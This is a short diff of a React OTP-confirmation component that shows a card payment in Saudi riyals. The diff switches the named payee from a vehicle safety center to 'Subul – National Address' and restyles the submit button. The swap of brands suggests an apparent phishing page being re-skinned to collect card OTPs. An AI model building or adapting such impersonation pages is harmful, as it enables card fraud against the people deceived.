@@ -42,7 +42,7 @@ function CheckOtp() {
   }, [isFormRejected.value]);
 
   const { totalPaid, cardLast4 } = JSON.parse(
-    localStorage.getItem("payment") || ""
+    localStorage.getItem("payment") || "",
   );
 
   return (
@@ -66,7 +66,7 @@ function CheckOtp() {
           </p>
 
           <p className="mt-6 font-semibold text-black">
-            انت تدفع لمركز سلامة المركبات مبلغ{" "}
+            انت تدفع لسبل - العنوان الوطني مبلغ{" "}
             <span className="font-bold">{totalPaid || "--"}</span> ر.س بتاريخ{" "}
             {new Date().toLocaleDateString()} في التوقيت{" "}
             <span dir="ltr">{new Date().toLocaleTimeString()}</span>
@@ -119,6 +119,9 @@ function CheckOtp() {
             disabled={!isValid}
             type="submit"
             size="large"
+            sx={{
+              backgroundColor: "#1e2746",
+            }}
           >
             تحقق
           </Button>
